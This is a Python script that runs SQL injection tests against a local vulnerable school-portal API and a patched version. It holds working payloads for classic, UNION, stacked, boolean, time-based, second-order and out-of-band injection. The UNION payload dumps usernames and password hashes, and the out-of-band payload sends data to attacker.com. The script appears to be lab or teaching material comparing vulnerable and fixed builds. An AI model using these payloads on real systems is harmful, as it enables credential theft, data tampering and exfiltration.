import requests
import time

VULN_URL = "http://localhost:8001/api"
PREV_URL = "http://localhost:8002/api"

def login(url, username, password):
    r = requests.post(f"{url}/login", data={"username": username, "password": password})
    return r.json().get("access_token")

def test_classic(token, url):
    h = {"Authorization": f"Bearer {token}"}
    print(f"\n--- Testing Classic SQLi against {url} ---")
    r1 = requests.get(f"{url}/teacher/students", headers=h)
    print("Normal (no q):", len(r1.json()), "students")
    r2 = requests.get(f"{url}/teacher/students?q=a%25'%20OR%201%3D1%20--", headers=h)
    print("Injected (q=a%' OR 1=1 --):", len(r2.json()), "students")

def test_union(token, url):
    h = {"Authorization": f"Bearer {token}"}
    print(f"\n--- Testing UNION SQLi against {url} ---")
    # Payload: -1 UNION SELECT 999, 'STOLEN DATA', 'Secret', username || ' : ' || hashed_password, 'all', '2025-01-01', '2025-12-31', 'Hacker' FROM users LIMIT 1 --
    payload = "-1 UNION SELECT 999, 'STOLEN DATA', 'Secret', username || ' : ' || hashed_password, 'all', '2025-01-01', '2025-12-31', 'Hacker' FROM users LIMIT 1 --"
    r = requests.get(f"{url}/student/notices/{payload}", headers=h)
    print("Response Status:", r.status_code)
    print("Notice content:", r.json().get("content") if r.status_code == 200 else r.json())

def test_stacked(token, url):
    h = {"Authorization": f"Bearer {token}"}
    print(f"\n--- Testing Stacked SQLi against {url} ---")
    payload = "1'); INSERT INTO notices (title, category, content, target_audience, publish_date, expiry_date, author_id) VALUES ('Hacked Notice', 'Alert', 'This was created via Stacked Query!', 'all', '2025-01-01', '2025-12-31', 1); --"
    r = requests.get(f"{url}/teacher/students/{payload}", headers=h)
    print("Lookup Status:", r.status_code)
    
    # Check if notice was created
    r_notices = requests.get(f"{url}/student/notices", headers=h) # Using teacher token? Wait, teacher can't read notices? Teacher can view students, maybe not read notices. Let's just login as student to check.
    return

def check_notices(token, url):
    h = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"{url}/student/notices", headers=h)
    notices = r.json()
    print("Found notices with 'Hacked':", [n["title"] for n in notices if "Hacked" in n["title"]])

def test_boolean(token, url):
    h = {"Authorization": f"Bearer {token}"}
    print(f"\n--- Testing Boolean SQLi against {url} ---")
    r_true = requests.get(f"{url}/teacher/verify-student?register_number=REG2023100' AND 1=1 --", headers=h)
    r_false = requests.get(f"{url}/teacher/verify-student?register_number=REG2023100' AND 1=0 --", headers=h)
    print("TRUE Payload:", r_true.json())
    print("FALSE Payload:", r_false.json())

def test_time(token, url):
    h = {"Authorization": f"Bearer {token}"}
    print(f"\n--- Testing Time SQLi against {url} ---")
    payload = "CS101' AND (SELECT sleep(3)) = 1 --"
    start = time.time()
    r = requests.get(f"{url}/student/check-eligibility?subject_code={payload}", headers=h)
    elapsed = time.time() - start
    print("Elapsed time:", elapsed, "seconds. Status:", r.status_code)

def test_oob(token, url):
    h = {"Authorization": f"Bearer {token}"}
    print(f"\n--- Testing OOB SQLi against {url} ---")
    payload = "Test'); SELECT http_get('http://attacker.com/steal?data=' || (SELECT username FROM users LIMIT 1)); --"
    r = requests.post(f"{url}/student/report-issue", json={"title": "Hacked", "description": payload}, headers=h)
    print("Report Issue Response:", r.json())
    
    # Check events
    r2 = requests.get(f"{url}/student/oob-events", headers=h)
    events = r2.json()
    print("OOB Events Count:", len(events))
    if events:
        print("Latest Event:", events[0])

def test_second_order(token, url):
    h = {"Authorization": f"Bearer {token}"}
    print(f"\n--- Testing Second-Order SQLi against {url} ---")
    payload = "O-' UNION SELECT 999, 'O-', 9999 --"
    # Stage 1
    r1 = requests.put(f"{url}/student/profile", json={"blood_group": payload}, headers=h)
    print("Profile Update Status:", r1.status_code)
    # Stage 2
    r2 = requests.get(f"{url}/student/blood-drive-status", headers=h)
    print("Blood Drive Status:", r2.json())


def run():
    print("Logging in...")
    t_vuln = login(VULN_URL, "EMP001", "teacher123")
    s_vuln = login(VULN_URL, "REG2023100", "student123")
    
    t_prev = login(PREV_URL, "EMP001", "teacher123")
    s_prev = login(PREV_URL, "REG2023100", "student123")
    
    if not t_vuln or not s_vuln:
        print("Login failed!")
        return

    # Classic
    test_classic(t_vuln, VULN_URL)
    test_classic(t_prev, PREV_URL)
    
    # UNION
    test_union(s_vuln, VULN_URL)
    test_union(s_prev, PREV_URL)
    
    # Stacked
    test_stacked(t_vuln, VULN_URL)
    test_stacked(t_prev, PREV_URL)
    check_notices(s_vuln, VULN_URL)
    check_notices(s_prev, PREV_URL)
    
    # Boolean
    test_boolean(t_vuln, VULN_URL)
    test_boolean(t_prev, PREV_URL)
    
    # Time
    test_time(s_vuln, VULN_URL)
    test_time(s_prev, PREV_URL)
    
    # OOB
    test_oob(s_vuln, VULN_URL)
    test_oob(s_prev, PREV_URL)
    
    # Second-Order
    test_second_order(s_vuln, VULN_URL)
    test_second_order(s_prev, PREV_URL)

if __name__ == "__main__":
    run()
